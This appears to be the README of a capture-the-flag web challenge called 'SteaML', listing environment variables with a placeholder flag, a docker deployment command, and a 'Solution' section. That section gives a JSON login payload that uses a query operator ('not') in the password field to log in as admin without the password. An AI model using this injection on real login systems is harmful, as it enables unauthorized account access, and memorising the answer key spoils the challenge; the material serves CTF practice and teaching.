# SteaML

SteaML is the world most biggest game community.

## Environment Variables

To run this project, you will need to add the following environment variables to your .env / docker-compose.yml file

`DATABASE_URL` mysql://username:password@localhost:3306/dbname

`JWT_SECRET` Secret

`ADMIN_PASSWORD` Administrator password

`FLAG` IFEST{f4k3_f146}

## Deployment

To deploy this project run

```bash
  docker compose up --build
```

## Solution

Send a request to login api with following request schema.

```
{
  "username" : "admin",
  "password" : {
    "not": "a"
  }
}
```

With this request schema, then the database will try to query a user with username admin and with password that is not equal to string "a"
